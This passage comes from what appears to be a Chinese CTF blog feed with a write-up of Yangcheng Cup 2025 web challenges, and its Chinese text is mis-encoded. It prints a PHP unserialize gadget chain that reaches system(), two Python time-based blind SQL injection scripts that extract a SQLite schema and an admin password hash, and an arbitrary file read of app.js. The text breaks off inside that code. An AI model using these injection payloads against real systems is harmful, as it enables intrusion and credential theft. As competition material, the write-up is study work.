    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/&quot;&gt;https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wx.zsxq.com/group/824215518412&quot;&gt;https://wx.zsxq.com/group/824215518412&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¾ŠåŸæ¯2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/10/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/10/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/</id>
    <published>2025-10-11T06:20:23.000Z</published>
    <updated>2026-01-04T02:39:38.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>qwb å‰ç»</p><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA">https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$first</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$step</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$next</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">first</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ç»§ç»­åŠ æ²¹ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">next</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$you</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$found</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin123"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"secret"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">" maybe is here!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">found</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fifth</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$step</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$finalstep</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/U/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">finalstep</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä»”ç»†æƒ³æƒ³ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">step</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">finalstep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">step</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">H</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$who</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$are</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$you</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">you</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"nobody"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">who</span><span class="token operator">-></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">N</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$congratulation</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$yougotit</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$func_name</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func_name</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">U</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$almost</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$there</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">there</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">N</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">there</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">V</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$good</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$keep</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dowhat</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$go</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dowhat</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">go</span><span class="token operator">-></span><span class="token variable">$abc</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"&lt;br>Win!!!&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é“¾å­ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="ezsignin"><a href="#ezsignin" class="headerlink" title="ezsignin"></a>ezsignin</h2><p>æ³¨å†Œå’Œç™»å½•</p><p>æ³¨æ„åˆ°æ³¨å†Œæ—¶ username ç”¨å•å¼•å·ä¼šè¿”å›æ³¨å†Œå¤±è´¥ï¼Œä¸¤ä¸ªå•å¼•å·åˆ™æ­£å¸¸ï¼Œä¸”åªæœ‰ <code>--</code> èƒ½æ³¨é‡Šï¼Œè¯´æ˜æ˜¯ sqlite</p><p>é‚£ä¹ˆå°±æ˜¯ insert æ³¨å…¥ï¼ŒçŒœæµ‹åç«¯å¤§è‡´å¦‚ä¸‹</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">insert into users(username,password) values(&#39;$&#123;username&#125;&#39;,&#39;$&#123;password&#125;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ username å¤„æ³¨å…¥ <code>&#39;,payload)--+</code> å®ç°é—­åˆ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"1234567890ABCDEF~"</span>url <span class="token operator">=</span> <span class="token string">'http://45.40.247.139:30959/register'</span>flag <span class="token operator">=</span> <span class="token string">'435245415445205441424'</span>num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">'zyxwvutsrqponmlkjihgfedcba'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"',(case when(substr((select hex(sql) from sqlite_master),&#123;0&#125;,1)='&#123;1&#125;') then randomblob(300000000) else 0 end))--+"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"confirmPassword"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        spend_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time        <span class="token comment"># print(spend_time,i)</span>        <span class="token keyword">if</span> spend_time <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†å‡ºæ¥çš„åˆ›å»ºè¡¨è¯­å¥ä¸º</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">CREATE TABLE users (    id INTEGER PRIMARY KEY AUTOINCREMENT,    username TEXT UNIQUE NOT NULL,    password TEXT NOT NULL,    is_admin BOOLEAN DEFAULT 0,    created_at DATETIME DEFAULT CURRENT_TIMESTAMP);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åçˆ†å¯¹åº”çš„ usernameï¼Œis_admin åˆ—</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">&#39;,(case when(substr((select hex(group_concat(username)) from users),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;) then randomblob(300000000) else 0 end))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯çŸ¥  <code>Admin</code> æ˜¯ç®¡ç†å‘˜</p><p>ä¸èƒ½ç”¨ group_concat çˆ† password ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨å†™å…¥é•¿ password ï¼Œè¿™æ ·ä¼šæ— é™é€’å½’å¯¼è‡´é¶æœºç›´æ¥ 502ï¼Œç›´æ¥è¯»ç¬¬ä¸€è¡Œå°±è¡Œ</p><p>æœ€ç»ˆè¯»å‡ºæ¥çš„å¯†ç æ˜¯ <code>98e32d889927abe4014282166e89a323</code>ï¼Œæ­¤å¤„éœ€è¦é€æ­¥çˆ†ç ´æ¯”è¾ƒç¨³å®š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"1234567890ABCDEF~"</span>url <span class="token operator">=</span> <span class="token string">'http://45.40.247.139:19815/register'</span>flag <span class="token operator">=</span> <span class="token string">'3938653332643838393932376162'</span>num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        <span class="token comment"># payload = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',6)) + "',(case when(substr((select hex(sql) from sqlite_master),&#123;0&#125;,1)='&#123;1&#125;') then randomblob(300000000) else 0 end))--+".format(num,i)</span>        payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">'zyxwvutsrqponmlkjihgfedcba'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"',(case when(substr((select hex(password) from users),1,&#123;0&#125;)='&#123;1&#125;') then randomblob(300000000) else 0 end))--+"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>flag<span class="token operator">+</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"confirmPassword"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        spend_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time        <span class="token comment"># print(spend_time,i)</span>        <span class="token keyword">if</span> spend_time <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™»è¿›å»å‘ç°ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»ï¼Œå…ˆè¯» ..&#x2F;app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> sqlite3 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'sqlite3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">verbose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">sqlite3<span class="token punctuation">.</span>Database</span><span class="token punctuation">(</span><span class="token string">'./db.sqlite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*FLAG in /fla4444444aaaaaagg.txt*/</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>  <span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token string">'welcometoycb2025'</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">secure</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">checkPermission</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/login'</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/register'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ— æƒé™è®¿é—®'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>checkPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  fs<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'documents'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> files</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'è¯»å–ç›®å½•æ—¶å‘ç”Ÿé”™è¯¯:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ç›®å½•è¯»å–å¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>files <span class="token operator">=</span> files<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> files<span class="token punctuation">,</span> <span class="token literal-property property">user</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token 